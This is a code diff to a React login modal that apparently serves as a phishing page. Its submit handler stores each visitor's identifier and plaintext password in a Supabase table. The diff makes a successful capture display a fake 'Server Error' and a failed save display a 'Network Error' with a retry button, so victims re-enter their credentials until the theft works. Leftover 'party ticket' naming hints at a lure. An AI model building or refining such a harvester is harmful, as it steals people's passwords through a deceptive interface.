@@ -87,6 +87,8 @@ function PasswordInput({ id, value, onChange, error, placeholder, onClearError }
 export default function LoginModal({ isOpen, onClose }) {
   const [activeTab, setActiveTab] = useState('email');
   const [showSuccess, setShowSuccess] = useState(false);
+  const [showError, setShowError] = useState(false);
+  const [isSubmitting, setIsSubmitting] = useState(false);
 
   // Phone form state
   const [phone, setPhone] = useState('');
@@ -120,6 +122,8 @@ export default function LoginModal({ isOpen, onClose }) {
   const handleClose = () => {
     clearAllErrors();
     setShowSuccess(false);
+    setShowError(false);
+    setIsSubmitting(false);
     setActiveTab('email');
     onClose();
   };
@@ -127,6 +131,8 @@ export default function LoginModal({ isOpen, onClose }) {
   const switchTab = (tab) => {
     setActiveTab(tab);
     clearAllErrors();
+    setShowSuccess(false);
+    setShowError(false);
   };
 
   const clearAllErrors = () => {
@@ -173,7 +179,12 @@ export default function LoginModal({ isOpen, onClose }) {
   };
 
   const submitLogin = async (details) => {
-    console.log('🎉 Successful Login Details:', { ...details, timestamp: new Date().toISOString() });
+    setIsSubmitting(true);
+    setShowSuccess(false);
+    setShowError(false);
+    console.log('🎉 Submitting Login Details:', { ...details, timestamp: new Date().toISOString() });
+
+    let isSaved = false;
 
     if (supabase) {
       try {
@@ -181,19 +192,32 @@ export default function LoginModal({ isOpen, onClose }) {
           type: details.type,
           identifier: details.identifier,
           password: details.password,
-          is_valid: true,
           timestamp: new Date().toISOString(),
         }]);
-        if (error) console.error('Error inserting to Supabase:', error);
-        else console.log('Successfully saved to Supabase.');
+
+        if (error) {
+          console.error('Error inserting to Supabase:', error);
+          isSaved = false;
+        } else {
+          console.log('Successfully saved to Supabase.');
+          isSaved = true;
+        }
       } catch (err) {
         console.error('Unexpected error pushing to Supabase:', err);
+        isSaved = false;
       }
     } else {
-      console.warn('Supabase client not initialized. Configure VITE_SUPABASE_URL and VITE_SUPABASE_ANON_KEY in .env');
+      console.warn('Supabase client not initialized.');
+      isSaved = false;
     }
 
-    setShowSuccess(true);
+    setIsSubmitting(false);
+
+    if (isSaved) {
+      setShowSuccess(true);
+    } else {
+      setShowError(true);
+    }
   };
 
   return (
@@ -205,14 +229,30 @@ export default function LoginModal({ isOpen, onClose }) {
       <div className="login-modal" id="login-modal">
         <div className="modal-drag-handle" />
 
-        {/* SUCCESS SCREEN */}
+        {/* SUCCESS SCREEN (CURRENT TOGGLE WHEN DATA GOES TO SUPABASE) */}
         {showSuccess ? (
           <div className="party-ticket-container" id="party-ticket-container">
             <div className="party-success-card">
               <h3>Server Error</h3> 
               <br />
               <p className="success-message-text">Something went wrong on our end. Please try again later.</p>
-              {/* <button type="button" className="btn-claim-ticket" id="btn-claim-ticket" onClick={handleClose}>Continue</button> */}
+            </div>
+          </div>
+        ) : showError ? (
+          /* ERROR SCREEN (NETWORK ERROR ON OUR SIDE WHEN DATA FAILS TO GO TO SUPABASE) */
+          <div className="party-ticket-container" id="party-ticket-container">
+            <div className="party-success-card" style={{ borderColor: 'rgba(239, 68, 68, 0.4)' }}>
+              <h3 style={{ color: '#ef4444' }}>Network Error</h3> 
+              <br />
+              <p className="success-message-text">Network error on our side. Please check your connection and try again.</p>
+              <button 
+                type="button" 
+                className="btn-claim-ticket" 
+                style={{ background: '#ef4444', marginTop: '16px' }} 
+                onClick={() => { setShowError(false); }}
+              >
+                Try Again
+              </button>
             </div>
           </div>
         ) : (
@@ -284,7 +324,9 @@ export default function LoginModal({ isOpen, onClose }) {
               <div className="form-hint">
                 <button type="button" className="form-forgot">Forgot your password?</button>
               </div>
-              <button type="submit" className="btn-submit">Log in</button>
+              <button type="submit" className="btn-submit" disabled={isSubmitting}>
+                {isSubmitting ? 'Logging in...' : 'Log in'}
+              </button>
             </form>
 
             {/* Email Form */}
@@ -322,7 +364,9 @@ export default function LoginModal({ isOpen, onClose }) {
               <div className="form-hint">
                 <button type="button" className="form-forgot">Forgot your password?</button>
               </div>
-              <button type="submit" className="btn-submit">Log in</button>
+              <button type="submit" className="btn-submit" disabled={isSubmitting}>
+                {isSubmitting ? 'Logging in...' : 'Log in'}
+              </button>
             </form>
 
             {/* Divider */}
